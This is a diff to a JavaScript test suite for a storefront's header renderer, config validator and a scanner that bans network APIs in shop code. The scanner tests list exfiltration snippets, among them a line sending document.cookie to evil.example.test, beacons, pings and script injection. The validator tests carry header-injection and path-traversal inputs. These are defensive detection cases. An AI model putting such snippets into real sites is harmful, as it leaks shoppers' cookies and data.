@@ -20,7 +20,7 @@ const dirsOf = (csp) => Object.fromEntries(csp.split(';').map((p) => p.trim().sp
 const ORIGINS = { apiOrigin: 'https://api.shop.example.test', imageOrigin: 'https://img.shop.example.test' };
 const merchant = (extra = {}) => makeMerchant({ apiBase: ORIGINS.apiOrigin, imageOrigin: ORIGINS.imageOrigin, ...extra });
 const onCsp = (text, re, to) => text.replace(/^ {2}Content-Security-Policy:.*$/m, (l) => l.replace(re, to));
-const setCfg = (d, patch) => write(d, 'merchant.headers.json', JSON.stringify({ ...JSON.parse(read(d, 'merchant.headers.json')), ...patch }, null, 2) + '\n');
+const setCfg = (d, patch) => write(d, 'merchant.headers.json', JSON.stringify({ ...JSON.parse(read(d, 'merchant.headers.json').replace(/^﻿/, '')), ...patch }, null, 2) + '\n');
 
 // ───────────── the renderer ─────────────
 test('render: connect-src is self + the API origin, img-src is self + data: + the image origin; no blanket https:, deterministic', () => {
@@ -69,6 +69,36 @@ test('validate: only bare https origins; no scheme sources, wildcards, http, loc
   assert.equal(originProblem('http://127.0.0.1:8180', { dev: true }), '');
   assert.notEqual(originProblem('http://example.test', { dev: true }), '');
   assert.throws(() => renderHeaders(f('scripts/headers.core.txt'), { ...ORIGINS, apiOrigin: 'https:' }));
+});
+
+test('render: a line over 2000 characters is an error; a legitimate maximal config fits; origins are limited to 100 characters, private suffixes are refused', () => {
+  const core = f('scripts/headers.core.txt');
+  const long = (i) => `https://${'a'.repeat(60)}.${String(i).padEnd(18, 'b')}.example.test`;
+  assert.equal(long(1).length, 100, 'fixture length');
+  const many = (n) => Array.from({ length: n }, (_, i) => long(i));
+  const ok = renderHeaders(core, { ...ORIGINS, extraConnect: many(5), extraImg: many(5) });
+  assert.ok(Math.max(...ok.split('\n').map((l) => l.length)) <= 2000, 'a full connect + img config fits');
+  assert.throws(() => renderHeaders(core, { ...ORIGINS, extraConnect: many(5), extraImg: many(5), extraFont: many(3), extraStyle: many(3), extraFrame: many(3) }), /line \d+ is \d+ characters \(limit 2000/);
+  const r = validateConfig({ ...ORIGINS, extraConnect: [long(1) + 'x'] });
+  assert.match(r.errors.join(), /longer than 100 characters/);
+  for (const h of ['x.local', 'x.example.localhost', 'api.internal', 'nas.lan', 'x.home.arpa', 'x.example.test.internal', 'localhost']) assert.ok(validateConfig({ ...ORIGINS, extraConnect: [`https://${h}`] }).errors.length, h);
+  assert.deepEqual(validateConfig({ ...ORIGINS, extraConnect: ['https://xn--fiq228c.example.test'] }).errors, [], 'punycode hosts are accepted as written');
+});
+
+test('render: extraRules adds Cache-Control rules only (validated, at most 5), after the core block', () => {
+  const core = f('scripts/headers.core.txt');
+  const out = renderHeaders(core, { ...ORIGINS, extraRules: [{ path: '/assets/*', cacheControl: 'public, max-age=31536000, immutable' }] });
+  assert.match(out, /\n\/assets\/\*\n {2}Cache-Control: public, max-age=31536000, immutable\n$/);
+  assert.equal(out.indexOf('Content-Security-Policy'), renderHeaders(core, ORIGINS).indexOf('Content-Security-Policy'));
+  const bad = (rules) => assert.ok(validateConfig({ ...ORIGINS, extraRules: rules }).errors.length, JSON.stringify(rules));
+  bad([{ path: '/x', cacheControl: 'a', header: 'Set-Cookie' }]);
+  bad([{ path: '/x' }]);
+  bad([{ path: 'x', cacheControl: 'no-store' }]);
+  bad([{ path: '/../x', cacheControl: 'no-store' }]);
+  bad([{ path: '/x', cacheControl: 'a\nSet-Cookie: x' }]);
+  bad([{ path: '/x', cacheControl: 'no-store' }, { path: '/x', cacheControl: 'no-cache' }]);
+  bad(Array.from({ length: 6 }, (_, i) => ({ path: `/p${i}`, cacheControl: 'no-store' })));
+  bad('x');
 });
 
 // ───────────── check-layers: public/_headers is derived ─────────────
@@ -120,6 +150,21 @@ test('check-layers (merchant): the rendered file passes; a stale or hand-edited 
   const mf = JSON.parse(read(d, 'scripts/commerce.manifest.json')); mf['public/_headers'] = '0'.repeat(64);
   write(d, 'scripts/commerce.manifest.json', JSON.stringify(mf, null, 2) + '\n');
   assert.equal(layers(d).status, 0, layers(d).out);
+});
+
+test('check-layers (merchant): a config saved with a UTF-8 BOM is accepted; extraRules render and pass', () => {
+  const m = merchant(); const d = m.dir;
+  write(d, 'merchant.headers.json', '\uFEFF' + read(d, 'merchant.headers.json'));
+  assert.equal(render(d).status, 0);
+  assert.equal(layers(d).status, 0, layers(d).out);
+  setCfg(d, { extraRules: [{ path: '/assets/*', cacheControl: 'public, max-age=86400' }] });
+  assert.equal(layers(d).status, 1, 'stale until rendered');
+  assert.equal(render(d).status, 0);
+  assert.match(read(d, 'public/_headers'), /\/assets\/\*\n {2}Cache-Control: public, max-age=86400/);
+  assert.equal(layers(d).status, 0, layers(d).out);
+  rmSync(path.join(d, 'merchant.headers.json'));
+  const r = layers(d);
+  assert.equal(r.status, 1); assert.match(r.out, /merchant\.headers\.json is missing/); assert.match(r.out, /render-headers\.mjs --root \. --core/); assert.match(r.out, /MIGRATION/);
 });
 
 test('check-layers (template): leftover placeholders are a WARNING, and the committed template renders exactly', () => {
@@ -175,7 +220,7 @@ test('sync-core: the merchant\'s origins survive, public/_headers is re-rendered
   const tpl = makeTemplateCopy(V2, withCoreHeader);
   assert.match(read(tpl, 'public/_headers'), /replace-with-api-origin/, 'the template copy carries placeholders');
   let r = sync(d, tpl, '--dry-run');
-  assert.equal(r.status, 0, r.out); assert.match(r.out, /public\/_headers: will be re-rendered/);
+  assert.equal(r.status, 0, r.out); assert.match(r.out, /public\/_headers: would be re-rendered from the core template \+ merchant\.headers\.json \(no manual edits found/);
   assert.equal(read(d, 'merchant.headers.json'), cfgBefore);
   r = sync(d, tpl, '--yes');
   assert.equal(r.status, 0, r.out); assert.match(r.out, /re-rendered: public\/_headers/);
@@ -189,6 +234,24 @@ test('sync-core: the merchant\'s origins survive, public/_headers is re-rendered
   assert.equal(read(d, 'scripts/headers.core.txt'), read(tpl, 'scripts/headers.core.txt'));
   assert.ok(!('public/_headers' in JSON.parse(read(d, 'scripts/commerce.manifest.json'))));
   assert.equal(layers(d).status, 0, layers(d).out);
+});
+
+test('sync-core: a hand-edited public/_headers is reported loudly (dry run and apply) before it is re-rendered; extraRules is the legitimate way', () => {
+  const m = merchant(); const d = m.dir;
+  write(d, 'public/_headers', read(d, 'public/_headers') + '\n/assets/*\n  Cache-Control: public, max-age=31536000\n');
+  git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'hand edit');
+  const tpl = makeTemplateCopy(V2, withCoreHeader);
+  let r = sync(d, tpl, '--dry-run');
+  assert.equal(r.status, 0, r.out);
+  assert.match(r.out, /public\/_headers HAS MANUAL EDITS\. This sync would re-render public\/_headers from the core template \+ merchant\.headers\.json; the manual edits would be LOST/);
+  assert.match(r.out, /\+?\s*-? ?\(in the file, not in the rendering\) \/assets\/\*/);
+  assert.match(r.out, /extraRules/);
+  assert.match(read(d, 'public/_headers'), /\/assets\/\*/, 'a dry run changes nothing');
+  r = sync(d, tpl, '--yes');
+  assert.equal(r.status, 0, r.out);
+  assert.match(r.out, /MANUAL EDITS\. This sync will re-render/);
+  assert.doesNotMatch(read(d, 'public/_headers'), /\/assets\/\*/);
+  assert.equal(layers(d).status, 0);
 });
 
 test('sync-core: refused without merchant.headers.json (migration text); an invalid config rolls the whole sync back', () => {
@@ -277,7 +340,44 @@ test('storefront scan (D20): network APIs are refused as identifiers, aliases, c
     ["window.open('https://evil.example.test');", /window\.open/],
     ["import('https://evil.example.test/x.js');", /dynamic import/],
     ["var m = import.meta;", /dynamic import/],
-    ["var q = \\u0066etch;", /fetch/]
+    ["var q = \\u0066etch;", /fetch/],
+    ["var o = self.fetch;", /self\.fetch/],
+    ["globalThis.fetch('/x');", /globalThis\.fetch/],
+    ["window.fetch('/x');", /window\.fetch/],
+    ["(window).fetch('/x');", /window\.fetch/],
+    ["window?.fetch?.('/x');", /window\.fetch/],
+    ["top.sendBeacon('/x');", /top\.sendBeacon/],
+    ["const { fetch: f } = window;", /taken from window/],
+    ["const { fetch } = globalThis;", /taken from globalThis/],
+    ["const { \"fetch\": f } = self;", /taken from self/],
+    ["var h = { fetch };", /fetch/],
+    ["call(a, fetch);", /fetch/],
+    ["window.WebSocket;", /window\.WebSocket/],
+    ["open('https://evil.example.test');", /bare open/],
+    ["window?.open('https://evil.example.test');", /window\.open/],
+    ["(window).open('https://evil.example.test');", /window\.open/],
+    ["self.open('x');", /window\.open/],
+    ["new window.Image().src = 'https://evil.example.test/p';", /new Image/],
+    ["new (window).Audio();", /new Image/],
+    ["const w = window;", /aliasing a global object/],
+    ["var g; g = globalThis;", /aliasing a global object/],
+    ["let s = (self);", /aliasing a global object/],
+    ["location.href = 'https://evil.example.test/?d=' + document.cookie;", /navigation/],
+    ["location = 'https://evil.example.test';", /navigation/],
+    ["document.location = url;", /navigation/],
+    ["window.location.assign('https://evil.example.test');", /navigation/],
+    ["location.replace(next);", /navigation/],
+    ["location.href = '#/ok' + '/x' + other + 'https://evil.example.test';", /navigation/],
+    ["var s = document.createElement('script');", /createElement/],
+    ["var s = document.createElement(\"iframe\");", /createElement/],
+    ["var s = document.createElement('link');", /createElement/],
+    ["var s = document.createElement('meta');", /createElement/],
+    ["var t = '<a href=\"/x\" ping=\"https://evil.example.test\">x</a>';", /ping/],
+    ["a.ping = 'https://evil.example.test';", /ping/],
+    ["a.setAttribute('ping', 'https://evil.example.test');", /ping/],
+    ["navigator.serviceWorker.register('/sw.js');", /serviceWorker/],
+    ["navigator?.serviceWorker;", /serviceWorker/],
+    ["navigator['serviceWorker'];", /serviceWorker/]
   ];
   for (const [code, re] of bad) {
     const r = withApp(d, code);
@@ -298,7 +398,27 @@ test('storefront scan (D20): copy text, comments, data keys and look-alike ident
     "var e = { fetch: 1, sendBeacon: 2 };",
     "var prefetched = 1, refetch = 2, fetchAll = 3, myWebSocket = 4, ImageList = [], newImage = 5;",
     "var f = 'Image' + ' gallery';",
-    "var g = { alt: 'new Image of the shop' };"
+    "var g = { alt: 'new Image of the shop' };",
+    "var o = { fetch: 1 }; o.fetch = 2; var x = o.fetch;",
+    "var api = {}; api?.fetch; api.fetch.name; api.sendBeacon; api.WebSocket; api?.EventSource;",
+    "var o = { \"fetch\": 1, 'sendBeacon': 2 };",
+    "switch (k) { case \"fetch\": break; case 'WebSocket': break; }",
+    "var o = { fetch: x, sendBeacon: y };",
+    "var api = {}; const { fetch: f } = api; const { sendBeacon: b, WebSocket: W } = api;",
+    "var api = {}; const { \"fetch\": f2 } = api;",
+    "var r = /fetch/g, r2 = /new Image()/, r3 = /sendBeacon|WebSocket/i; var n = 'abc'.replace(/fetch/, 'x');",
+    "if (/EventSource/.test(s)) { s = s.replace(/new Image\\(\\)/, ''); }",
+    "var a = 1 / 2; var b = a / 3;",
+    "var win = 1; var topic = 2; var selfie = 3; var parentNode = 4; var windows = [], opener = 5, reopen = 6, isOpen = true; isOpen = !isOpen;",
+    "function open() {} var drawer = { open: false, toggleOpen: 1 }; drawer.open = true; if (drawer.open) { drawer.open = false; }",
+    "var el = {}; el.open = 1; el.opened = 2;",
+    "location.hash = '#/shop'; var h = location.hash; if (location.hash === '#/x') { h = 1; }",
+    "location.replace(ok ? '#/order-status' : '#/'); location.href = '#/home';",
+    "var u = location.href.replace(/x/, 'y'); var p = location.pathname; var s = location.search;",
+    "var s = document.createElement('div'); var i = document.createElement('img'); var b = document.createElement('button');",
+    "var t = '<a href=\"#/x\" class=\"ping-pong\">x</a>'; var ping = 1; var pings = [ping];",
+    "var sw = 'serviceWorker is not used'; var x = { serviceWorker: 1 };",
+    "var w = window.innerWidth; var h = window.innerHeight; var s = window.scrollY; var z = self === window;"
   ];
   for (const code of good) { const r = withApp(d, code); assert.equal(r.status, 0, code + '\n' + r.out); }
   const t = layers(TEMPLATE);
